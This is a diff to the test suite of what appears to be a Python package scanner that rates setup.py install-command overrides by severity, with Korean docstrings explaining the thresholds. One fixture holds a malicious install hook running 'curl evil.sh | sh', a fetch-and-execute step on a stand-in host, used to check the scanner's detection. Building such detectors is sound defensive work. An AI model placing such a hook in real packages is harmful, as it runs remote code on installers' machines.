@@ -110,15 +110,58 @@ def test_real_world_setup_py_does_not_produce_high_findings(tmp_path):
     assert all(f.severity is not Severity.CRITICAL for f in findings)
 
 
-def test_install_command_override_is_high(tmp_path):
-    """Hijacking `install` runs on the victim's machine — that does block."""
+def test_install_hook_that_executes_is_high(tmp_path):
+    """`install` 을 가로챈 클래스가 실제로 뭔가 *실행*하면 그때 HIGH — 차단 대상."""
     (tmp_path / "setup.py").write_text(
-        "from setuptools import setup\nsetup(name='x', cmdclass={'install': object})\n",
+        "import os\n"
+        "from setuptools import setup\n"
+        "from setuptools.command.install import install\n"
+        "class Post(install):\n"
+        "    def run(self):\n"
+        "        os.system('curl evil.sh | sh')\n"
+        "setup(name='x', cmdclass={'install': Post})\n",
         encoding="utf-8",
     )
     hooks = [f for f in analyze_path(tmp_path) if f.rule == RULE_INSTALL_HOOK]
     assert len(hooks) == 1
     assert hooks[0].severity is Severity.HIGH
+
+
+def test_install_hook_without_exec_sink_is_medium(tmp_path):
+    """오버라이드 자체는 신호가 아니다 — 실행 싱크가 없으면 MEDIUM.
+
+    실측 근거: setuptools 69.5.1 이 자기 setup.py:85 에서 install 을 오버라이드해
+    .pth 를 심는다. 이걸 HIGH 로 두면 거의 모든 파이썬 환경에 깔려 있는 패키지가
+    block 되고, 그런 스캐너는 아무도 켜두지 않는다. code_patterns.py 의 판단 기준과
+    같다 — 존재가 아니라 조합이 신호다.
+    """
+    (tmp_path / "setup.py").write_text(
+        "from setuptools import setup\n"
+        "from setuptools.command.install import install\n"
+        "class WithPth(install):\n"
+        "    def initialize_options(self):\n"
+        "        install.initialize_options(self)\n"
+        "        self.extra_path = ('x', 'y')\n"
+        "setup(name='x', cmdclass={'install': WithPth})\n",
+        encoding="utf-8",
+    )
+    hooks = [f for f in analyze_path(tmp_path) if f.rule == RULE_INSTALL_HOOK]
+    assert len(hooks) == 1
+    assert hooks[0].severity is Severity.MEDIUM
+
+
+def test_install_hook_defined_elsewhere_is_reported_not_blocked(tmp_path):
+    """클래스가 다른 모듈에 있으면 들여다볼 수 없다 — 조용히 넘기지 않되 차단도 안 한다."""
+    (tmp_path / "setup.py").write_text(
+        "from setuptools import setup\n"
+        "from mypkg.cmds import Custom\n"
+        "setup(name='x', cmdclass={'install': Custom})\n",
+        encoding="utf-8",
+    )
+    hooks = [f for f in analyze_path(tmp_path) if f.rule == RULE_INSTALL_HOOK]
+    assert len(hooks) == 1
+    assert hooks[0].severity is Severity.MEDIUM
+    assert "could not inspect" in hooks[0].detail
 
 
 def test_build_only_command_override_stays_medium(tmp_path):
